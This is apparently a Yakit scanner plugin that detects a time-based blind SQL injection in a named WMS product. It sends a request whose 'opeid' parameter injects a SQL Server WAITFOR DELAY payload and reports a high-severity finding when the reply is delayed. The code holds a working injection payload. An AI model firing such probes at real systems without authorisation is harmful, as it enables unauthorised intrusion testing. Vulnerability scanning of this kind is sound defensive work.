# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `GET /MyDown/MyImportData?opeid=%27+WAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Cookie: JSESSIONID=83a23f73-2908-4424-abd9-6b044cdfe003; Language=zh-CN
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i

`

	begin_time=time.now()
    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
	poc.timeout(6),
    )
    resp_time=time.Since(begin_time)
    if int(resp_time) > 5000000000{
        yakit.Info("%v found 飞讯云WMS /MyDown/MylmportData 前台SQL注入", addr)
        risk.NewRisk(
        addr,
        risk.title("飞讯云WMS /MyDown/MylmportData 前台SQL注入"),
        risk.severity("high"),
        risk.titleVerbose("飞讯云WMS /MyDown/MylmportData 前台SQL注入"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
    
}
